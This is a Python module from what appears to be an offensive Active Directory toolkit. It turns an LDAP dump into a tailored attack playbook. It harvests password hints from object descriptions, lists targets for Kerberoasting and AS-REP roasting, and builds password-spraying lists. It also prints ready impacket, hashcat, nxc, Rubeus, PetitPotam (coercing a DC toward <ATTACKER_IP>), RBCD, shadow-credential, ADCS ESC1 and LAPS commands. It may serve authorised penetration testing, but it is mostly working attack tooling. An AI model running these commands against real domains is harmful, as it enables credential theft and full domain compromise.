"""Environment-specific attack playbook generation."""

import re
from typing import Dict, List, Optional

from . import __version__
from .score import LAPS_ATTRS, Obj

HINT_RE = re.compile(
    r"(?:pass(?:word|wd)?|pwd|cred(?:ential)?s?)\s*[:=\-]?\s*([^\s,;]+)", re.I)
HINT_STOPWORDS = {
    "policy", "required", "never", "expires", "changed", "reset", "hint",
    "same", "below", "above", "manager", "account", "accounts", "is", "for",
}


def password_hints(objects: List[Obj]) -> List[Dict[str, str]]:
    """Extract password-like values mentioned in descriptions/comments."""
    rows: List[Dict[str, str]] = []
    seen = set()
    for obj in objects:
        text = " ".join(obj.entry.all("description")
                        + obj.entry.all("info")
                        + obj.entry.all("comment"))
        if not text:
            continue
        for match in HINT_RE.finditer(text):
            candidate = match.group(1).strip(".,;:()[]{}\"'")
            if len(candidate) < 4 or candidate.lower() in HINT_STOPWORDS:
                continue
            key = (obj.name.lower(), candidate)
            if key in seen:
                continue
            seen.add(key)
            rows.append({"object": obj.name, "candidate": candidate,
                         "context": text.strip()[:120]})
    return rows


def _enabled(objects: List[Obj]) -> List[Obj]:
    return [o for o in objects if "disabled" not in o.tags]


def _usernames(objects: List[Obj], tag: Optional[str] = None) -> List[str]:
    found = []
    for obj in _enabled(objects):
        if obj.kind != "user":
            continue
        sam = obj.entry.get("samaccountname")
        if not sam or sam.lower() == "krbtgt":
            continue
        if tag and tag not in obj.tags:
            continue
        found.append(sam)
    return sorted(dict.fromkeys(found), key=str.lower)


def _hostnames(objects: List[Obj], tag: Optional[str] = None) -> List[str]:
    found = []
    for obj in objects:
        if obj.kind != "computer":
            continue
        if tag and tag not in obj.tags:
            continue
        name = (obj.entry.get("dnshostname") or obj.name).rstrip("$")
        found.append(name)
    return sorted(dict.fromkeys(found), key=str.lower)


def _delegation_rows(objects: List[Obj], tag: str) -> List[str]:
    rows = []
    for obj in objects:
        if tag not in obj.tags:
            continue
        targets = obj.entry.all("msds-allowedtodelegateto")
        if targets:
            for target in targets:
                rows.append(f"`{obj.name}` → `{target}`")
        else:
            rows.append(f"`{obj.name}`")
    return rows


def render_playbook(objects: List[Obj], sources: List[str],
                    posture: Dict[str, object]) -> str:
    domain = posture.get("domain") or "<DOMAIN>"
    lines: List[str] = [
        f"# tiny playbook — {domain}",
        "",
        f"_{len(objects)} objects · generated by tiny {__version__}_",
        "",
        "Placeholders: `<DC_IP>` = domain controller address, "
        "`<USER>` / `<PASSWORD>` = a valid low-privilege credential.",
        "Every command is a starting point; confirm flags against your tool version.",
        "",
    ]

    tiers = {0: [], 1: []}
    for obj in objects:
        if obj.tier in tiers:
            tiers[obj.tier].append(obj.name)
    if tiers[0]:
        lines += ["## Crown jewels", "",
                  "Start here: " + ", ".join(f"`{n}`" for n in tiers[0][:12])
                  + (" …" if len(tiers[0]) > 12 else ""), ""]

    hints = password_hints(objects)
    if hints:
        lines += ["## Credential material in the dump", "",
                  "| Object | Candidate | Context |",
                  "|--------|-----------|---------|"]
        for row in hints:
            context = row["context"].replace("|", "\\|")
            lines.append(f"| `{row['object']}` | `{row['candidate']}` | {context} |")
        lines += ["",
                  "Full list: `password-candidates.txt`. LAPS values (if any) are in "
                  "`credentials.txt`.", ""]

    kerberoastable = _usernames(objects, "kerberoastable")
    if kerberoastable:
        lines += ["## Kerberoasting", "",
                  "Targets: " + ", ".join(f"`{u}`" for u in kerberoastable), "",
                  "```bash",
                  f"impacket-GetUserSPNs {domain}/<USER>:<PASSWORD> -dc-ip <DC_IP> \\",
                  "  -request -outputfile kerberoast.txt",
                  "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt",
                  "",
                  f"nxc ldap <DC_IP> -u <USER> -p <PASSWORD> --kerberoasting kerberoast.txt",
                  "```", ""]

    asrep = _usernames(objects, "asrep")
    if asrep:
        lines += ["## AS-REP roasting", "",
                  "Targets: " + ", ".join(f"`{u}`" for u in asrep), "",
                  "```bash",
                  f"impacket-GetNPUsers {domain}/ -usersfile asrep-users.txt \\",
                  "  -no-pass -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt",
                  "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt",
                  "",
                  f"nxc ldap <DC_IP> -u <USER> -p <PASSWORD> --asreproast asrep.txt",
                  "```", ""]

    spray_users = _usernames(objects)
    if spray_users:
        threshold = posture.get("lockout_threshold")
        if threshold == 0:
            warning = ("Lockout threshold is **0** (never): spraying will not lock "
                       "accounts, but it is still noisy.")
        elif isinstance(threshold, int):
            warning = (f"Lockout threshold is **{threshold}**: keep attempts below "
                       f"{threshold} per account per window, or you will lock accounts.")
        else:
            warning = ("Lockout threshold unknown: check the domain policy before "
                       "spraying.")
        lines += ["## Password spraying", "", warning, "",
                  f"{len(spray_users)} enabled users in `spray-users.txt`.", "",
                  "```bash",
                  "nxc smb <DC_IP> -u spray-users.txt -p passwords.txt \\",
                  "  --continue-on-success",
                  "```", ""]

    unconstrained = _hostnames(objects, "unconstrained")
    if unconstrained:
        lines += ["## Unconstrained delegation", "",
                  "Hosts: " + ", ".join(f"`{h}`" for h in unconstrained), "",
                  "These cache TGTs of anyone who authenticates. With local admin on "
                  "one of them:", "",
                  "```bash",
                  "# on the delegated host",
                  "Rubeus.exe monitor /interval:5 /nowrap",
                  "# from the attacker, coerce a DC",
                  "python3 PetitPotam.py <ATTACKER_IP> <DC_IP>",
                  "```", ""]

    constrained = _delegation_rows(objects, "constrained")
    if constrained:
        lines += ["## Constrained delegation", "",
                  *[f"- {row}" for row in constrained], "",
                  "```bash",
                  f"impacket-getST -spn <SPN> -impersonate Administrator \\",
                  f"  {domain}/<USER>:<PASSWORD> -dc-ip <DC_IP>",
                  "export KRB5CCNAME=Administrator.ccache",
                  "```", ""]

    rbcd = [o.name for o in objects if "rbcd" in o.tags]
    if rbcd:
        lines += ["## Resource-based constrained delegation", "",
                  "Configured on: " + ", ".join(f"`{n}`" for n in rbcd), "",
                  "```bash",
                  f"impacket-addcomputer {domain}/<USER>:<PASSWORD> -dc-ip <DC_IP> \\",
                  "  -computer-name 'TINY$' -computer-pass 'Passw0rd!'",
                  "impacket-rbcd -action write -delegate-from 'TINY$' \\",
                  "  -delegate-to '<TARGET>' -dc-ip <DC_IP> \\",
                  f"  {domain}/<USER>:<PASSWORD>",
                  "```", ""]

    shadow = [o.name for o in objects if "shadowcreds" in o.tags]
    if shadow:
        lines += ["## Shadow credentials", "",
                  "KeyCredentialLink present on: "
                  + ", ".join(f"`{n}`" for n in shadow), "",
                  "```bash",
                  f"pywhisker -d {domain} -u <USER> -p <PASSWORD> \\",
                  "  --target <TARGET> --action add",
                  "```", ""]

    adcs = [o for o in objects if "adcs" in o.tags]
    if adcs:
        esc1 = [o.name for o in adcs if "adcs-esc1" in o.tags]
        lines += ["## AD CS", "",
                  "Templates: " + ", ".join(f"`{o.name}`" for o in adcs), ""]
        if esc1:
            lines += ["ESC1 candidates: " + ", ".join(f"`{n}`" for n in esc1), ""]
        lines += ["```bash",
                  f"certipy find -u <USER>@{domain} -p <PASSWORD> -dc-ip <DC_IP> -vulnerable",
                  f"certipy req -u <USER>@{domain} -p <PASSWORD> -dc-ip <DC_IP> \\",
                  "  -ca <CA_NAME> -template <TEMPLATE> \\",
                  f"  -upn administrator@{domain}",
                  "```", ""]

    laps = [o.name for o in objects
            if any(o.entry.all(attr) for attr in LAPS_ATTRS)]
    if laps:
        lines += ["## LAPS", "",
                  "Readable LAPS passwords for: "
                  + ", ".join(f"`{n}`" for n in laps), "",
                  "The values are in `credentials.txt`; use them with the matching "
                  "machine account.", ""]

    if _hostnames(objects, "dc"):
        lines += ["## Recon", "",
                  "Domain controllers: "
                  + ", ".join(f"`{h}`" for h in _hostnames(objects, "dc")), "",
                  "```bash",
                  "nxc smb <DC_IP> -u <USER> -p <PASSWORD> --shares",
                  f"bloodhound-python -d {domain} -u <USER> -p <PASSWORD> \\",
                  "  -ns <DC_IP> -c All",
                  "```", ""]

    if len(lines) <= 7:
        lines += ["No high-signal findings in this dump. The tier files and "
                  "`report.md` still describe the environment.", ""]
    return "\n".join(lines)
